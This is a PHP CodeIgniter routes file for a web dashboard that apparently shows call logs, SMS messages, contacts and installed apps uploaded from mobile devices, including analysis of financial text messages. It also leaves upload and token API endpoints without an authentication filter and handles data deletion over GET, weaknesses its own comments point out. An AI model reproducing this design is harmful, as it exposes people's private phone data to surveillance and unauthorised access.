<?php

use CodeIgniter\Router\RouteCollection;

/**
 * @var RouteCollection $routes
 */

// =================================================================
// 1. PUBLIC ROUTES (Landing Pages)
//    Routes for the main public-facing website, often handled by the Home controller.
// =================================================================

// Base URL: The default route
$routes->get('/', 'Home::index', ['as' => 'home']);

// General landing/marketing pages
$routes->get('landing', 'Home::index', ['as' => 'landing']);
$routes->get('download', 'Home::landing_download');
$routes->get('aboutus', 'Home::landing_aboutus');
$routes->get('faqs_terms', 'Home::landing_faqs');
$routes->get('how_to', 'Home::landing_how_to');
$routes->get('error_404', 'Home::landing_error_404');
$routes->get('prices', 'auth\ContactController::submit'); // Note: 'prices' often links to a view, not a submission handler.

// Contact Form (handles both GET for view and POST for submission)
$routes->match(['get', 'post'], 'contactus', 'Home::landing_contactus');


// =================================================================
// 2. AUTHENTICATION ROUTES (CI4 Shield)
// =================================================================

// Shield's built-in routes. This loads many routes for registration, verification, etc.
// Note: Uncommenting the custom group below can override or duplicate these.
service('auth')->routes($routes);

// Custom Authentication Routes:
// This group is often used to ensure your custom controllers (auth\LoginController, etc.)
// are used instead of the default Shield controllers.
$routes->group('', ['namespace' => 'App\Controllers'], static function ($routes) {
    // Login
    $routes->get('login', 'auth\LoginController::loginView', ['as' => 'login']);
    $routes->post('login', 'auth\LoginController::loginAction');
    $routes->get('logout', 'auth\LoginController::logoutAction', ['as' => 'logout']);

    // Registration
    $routes->get('register', 'auth\RegisterController::registerView', ['as' => 'register']);
    // FIX: Corrected namespace/controller name from 'Aauth' to 'auth'
    $routes->post('register', 'auth\RegisterController::registerAction');

    // Forgot Password
    $routes->get('forgot', 'auth\ForgotPasswordController::forgotView', ['as' => 'forgot']);
    $routes->post('forgot', 'auth\ForgotPasswordController::forgotAction');

    // Reset Password
    $routes->get('reset-password', 'auth\ForgotPasswordController::resetView', ['as' => 'reset-password']);
    $routes->post('reset-password', 'auth\ForgotPasswordController::resetAction');
});

// =================================================================
// 3. CLIENT/DASHBOARD ROUTES
//    Grouped under the 'clients' namespace and should typically be protected by a filter
//    (like 'session' or 'auth:session').
// =================================================================

$routes->group('', ['namespace' => 'App\Controllers\clients', 'filter' => 'session'], static function ($routes) {

    // --- General Client Pages ---
    $routes->get('home', 'Client::home', ['as' => 'client-home']);
    $routes->get('faqs', 'Client::faqs');

    // --- Data Views (Apps) ---
    $routes->get('apps', 'Apps::apps');
    $routes->get('apps/unique', 'Apps::apps');
    $routes->get('apps/last_time', 'Apps::apps_last_time');
    $routes->get('apps/all_apps', 'Apps::apps'); // Note: Duplicates above route, consider merging logic.

    // --- Data Views (Call Logs) ---
    $routes->get('call_logs', 'Calls::call_logs');
    $routes->get('call_logs/incoming', 'Calls::call_incoming');
    $routes->get('call_logs/outgoing', 'Calls::call_outgoing');
    $routes->get('call_logs/rejected', 'Calls::call_rejected');
    $routes->get('call_logs/blocked', 'Calls::call_blocked');

    // --- Data Views (SMS) ---
    $routes->get('sms', 'Sms::sms');
    $routes->get('sms/inbox', 'Sms::sms_inbox');
    $routes->get('sms/sent', 'Sms::sms_sent');

    // --- Data Views (Contacts) ---
    $routes->get('contacts', 'Contacts');

    // --- Analysis/Correlation ---
    $routes->get('analysis', 'Correlation::index');
    $routes->get('analysis/sms/finance', 'Correlation::sms_finance');
    $routes->get('analysis/sms/finance/(:any)', 'Correlation::sms_analyze_finance_from/$1');

    $routes->get('analysis/set_rules', 'Correlation::set_sms_rules');
    $routes->post('analysis/set/set_sms_datapoints/(:any)', 'Correlation::set_sms_datapoints/$1');

    // --- Contact Analysis (Dynamic) ---
    $routes->get('contacts/analyze/sms/(:any)', 'Analyze::sms/$1');
    $routes->get('contacts/analyze/calls/(:any)', 'Analyze::calls/$1');

    // --- Account Management ---
//    $routes->get('account/profile', 'clients\Account::index');
//    $routes->get('account/setting', 'Account::setting');
//    $routes->get('account/logs', 'Account::access_logs');
    $routes->group('account', ['namespace' => 'App\Controllers\clients'], function($routes) {
        $routes->get('profile', 'Account::home');
        $routes->get('setting', 'Account::setting');
        $routes->get('logs', 'Account::access_logs');
    });

    // --- Account Actions ---
    $routes->get('account/profile/update', 'Profile::profile_update');      // GET/POST combo might be better
    $routes->get('account/profile/image_upload', 'Profile::profile_upload'); // GET/POST combo might be better

    $routes->get('account/setting/token_generate', 'Profile::token_generate'); // Should probably be a POST

    $routes->get('account/requests', 'Requests::send_request'); // Should probably be a POST
    $routes->get('account/requests/sleep', 'Requests::send_sleep'); // Should probably be a POST

    // --- Data Deletion Actions (Should all be POST or DELETE requests) ---
    $routes->get('account/data/del/apps', 'Profile::profile_del_apps');
    $routes->get('account/data/del/call_logs', 'Profile::profile_del_call_logs');
    $routes->get('account/data/del/contacts', 'Profile::profile_del_contacts');
    $routes->get('account/data/del/sms', 'Profile::profile_del_sms');
});

// =================================================================
// 4. API/WEBHOOK ROUTES
//    These typically require an API key/token and should be protected by a filter
//    like 'tokens' or a custom API key middleware.
// =================================================================

$routes->group('api', ['namespace' => 'App\Controllers\api'], static function ($routes) {
    // API endpoint for file uploads (e.g., from a mobile app)
    $routes->post('files/upload', 'Receive::upload');

    // API endpoint for verifying a device/user token
    $routes->post('token/verify', 'Receive::token_verify');

    // API endpoint for receiving device printing information
    $routes->post('device/print', 'Receive::device_print');
});

// =================================================================
// Shield Action Controllers (Commented out - usually not needed if
// you use `service('auth')->routes($routes)`)
// =================================================================

// $routes->group('', ['namespace' => 'CodeIgniter\Shield\Controllers'], static function ($routes) {
//     $routes->get('auth/a/show', 'ActionController::show');
//     $routes->post('auth/a/handle', 'ActionController::handle');
//     $routes->get('auth/a/verify', 'ActionController::verify');
// });